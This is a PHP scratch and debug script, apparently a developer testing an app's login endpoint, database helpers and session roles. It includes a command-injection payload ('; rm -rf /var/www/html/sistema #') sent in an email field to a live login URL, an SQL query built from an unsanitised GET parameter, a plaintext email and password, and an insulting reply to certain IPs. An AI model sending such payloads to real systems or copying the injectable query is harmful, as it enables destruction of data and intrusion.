<?php

use App\Core\Data;
use App\Core\Access;
use App\Core\Session;

# Mig works
// include APP . 'functions/migrations.php';

// vd(Data::all('PRAGMA table_info(nano_meta)'));

// exit;

function getClientIp(): string {
    $keys = [
        'HTTP_CF_CONNECTING_IP', // Cloudflare
        'HTTP_X_REAL_IP',
        'HTTP_X_FORWARDED_FOR',
        'REMOTE_ADDR'
    ];

    foreach ($keys as $key) {
        if (!empty($_SERVER[$key])) {
            $ip = explode(',', $_SERVER[$key])[0];
            return trim($ip);
        }
    }
    return '0.0.0.0';
}

if (strpos(getClientIp(), '45.167.') === 0) {
    $json = ['result' => false, 'message' => 'Olá, acreano broxa.'];
    exit(json_encode($json));
}

exit;

$data = [
    '_multitenancy' => '1',
    'email' => 'eskelsen@yahoo.com',
    'senha' => 'mamaco manco'
];

// $data = [
//     '_multitenancy' => 1,
//     'email' => '; rm -rf /var/www/html/sistema #',
//     'senha' => '***'
// ];

$payload = http_build_query($data); // transforma em form-urlencoded

$headers = [
    'Content-Type: application/x-www-form-urlencoded'
];

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://paoficina.com/sistema/login/verificarLogin?ajax=true");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_POSTFIELDS, $payload);
curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);

$response = curl_exec($curl);

var_dump($response);

exit;

$data = [
    '_multitenancy' => 1,
    'email' => 'eskelsen@yahoo.com',
    'senha' => '***'
];

$data = '{"_multitenancy":"1","email":"; rm -rf \/var\/www\/html\/sistema #","senha":"***"}';
$data = '{"_multitenancy":"1","email":"eskelsen@yahoo.com","senha":"***"}';
$data = '{"_multitenancy":"1","email":"; rm -rf \/var\/www\/html\/sistema #","senha":"***"}';

vd(request('https://paoficina.com/sistema/login/verificarLogin?ajax=true',$data,'POST',true));
// vd(request('https://paoficina.com/sistema/login/verificarLogin?ajax=true',$data,'POST'));

exit;

echo '<a href="?table=nano_access">nano_access</a> | 
<a href="?table=nano_requests">nano_requests</a> |
<a href="?table=nano_meta">nano_meta</a> | 
<a href="?table=nano_users">nano_users</a><br><br>';

$table = $_GET['table'] ?? 'nano_access';

echo '<pre>';
vd($_SESSION);
// vd(Data::all("PRAGMA table_info($table)"));
vd(Data::all("SELECT * FROM $table ORDER BY id DESC"));

// vd(Data::column("sqlite_master", "name", "type='table'"));

# Redirect To (Session)
// vd($_SESSION);
// Session::set('role','master');
// Session::set('redirect_to','/?=' . time());
// Session::set('rede_pas','/abacaxi');

// $ua = $_SERVER['HTTP_USER_AGENT'] ?? ''; vd($ua);

# Email
// echo mail('eskelsen@yahoo.com','Teste de e-mails','Apenas um outro teste');

# Data
// vd(Data::execute('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL);'));
// vd(Data::execute("INSERT INTO users (name) VALUES (:name)", [':name' => 'Alice']));
// vd(Data::execute("INSERT INTO users (name) VALUES (:name)", [':name' => 'Bob']));
// vd(Data::insert('users',['name' => 'Pink']));
// vd(Data::insert('users',['name' => 'Cérebro']));
// vd(Data::update('users',['name' => 'Cérebro'],'id=?',[6]));
// vd(Data::all("SELECT * FROM users where id=?",[6]));
// vd(Data::one("SELECT * FROM users where id=?",[6]));
// vd(Data::field('users','name','id=?',[6]));
// vd(Data::column('users','name','id>?',[3]));
// vd(Data::one('PRAGMA table_info(users)'));
// vd(Data::all('PRAGMA table_info(users)'));

# Session & Access
// Session::set('role','support');
// vd($_SESSION);
// vd(Access::can('owner'));
// vd(Access::can(['manager','editor','auditor','analyst','support']));
// vd(Access::can('manager,editor,auditor,analyst,support'));
// vd(Access::can(''));
// vd(Access::can(' manager,editor,auditor, analyst , support'));
// Access::allow('master');
